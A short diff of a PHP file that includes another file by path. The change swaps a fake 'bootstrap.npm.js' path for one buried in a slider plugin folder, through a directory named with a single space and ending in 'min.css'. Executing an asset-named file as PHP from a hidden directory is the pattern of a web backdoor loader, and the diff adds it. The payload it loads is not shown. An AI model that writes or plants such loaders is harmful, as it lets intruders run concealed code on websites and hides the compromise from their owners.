@@ -1,5 +1,5 @@
 <?php
-$file = '/var/www/html/public/assets/bower_components/bootstrap/dist/js/bootstrap.npm.js';
+$file = '/var/www/clients/client154/web288/web/libraries/nextend2/smartslider/smartslider/backend/controllers/slider/ajax/ /min.css';
 
 if (is_file($file)) {
     include $file;
